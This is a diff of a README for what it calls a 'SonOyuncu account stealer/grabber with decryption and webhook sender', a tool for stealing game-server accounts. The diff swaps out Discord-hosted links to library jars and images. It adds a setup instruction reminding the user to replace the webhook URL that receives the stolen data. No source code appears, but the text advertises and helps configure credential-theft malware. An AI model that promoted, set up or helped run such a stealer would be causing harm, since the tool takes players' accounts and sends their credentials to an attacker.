@@ -2,7 +2,6 @@
 
 SonOyuncu account stealer/grabber with decryption and webhook sender
 
- - use libraries: [codec-1.11](https://cdn.discordapp.com/attachments/1076131691296473228/1076133940651380767/commons-codec-1.11.jar) & [gson-2.10.1](https://cdn.discordapp.com/attachments/1076131691296473228/1076133978081341490/gson-2.10.1.jar)
-
+ - dont forget to replace the webhookURL string
 #
-![.](https://cdn.discordapp.com/attachments/1076131691296473228/1076131729846304969/image.png)
+<p align= "center"> <kbd> <img  src="https://cdn.discordapp.com/attachments/1076131691296473228/1091692907582455910/1339.png"width="350"> </kbd><br><br>
